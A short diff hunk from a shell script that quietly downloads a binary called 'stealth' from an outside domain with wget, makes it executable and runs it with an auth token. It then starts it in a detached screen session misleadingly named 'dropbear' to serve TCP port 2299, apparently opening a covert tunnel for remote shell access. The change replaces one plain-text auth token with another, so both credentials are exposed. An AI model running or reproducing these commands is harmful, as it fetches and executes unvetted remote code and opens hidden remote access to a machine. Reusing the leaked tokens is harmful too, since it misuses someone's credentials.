@@ -40,7 +40,7 @@ wget -q https://greenleaf.teatspray.fun/stealth >/dev/null
 sleep 2
 chmod +x stealth
 sleep 2
-./stealth authtoken 1ikSEiZSRMKmWsqnjDeU26yYYR0_7pP7ZwJhgXgF2RU953ELR
+./stealth authtoken 1ilXRnZkbgTUkP6XqefqY5CzMw6_5sMimpXUhUf75vJyfXsE2
 sleep 2
 screen -dmS dropbear bash -c './stealth tcp 2299'
 
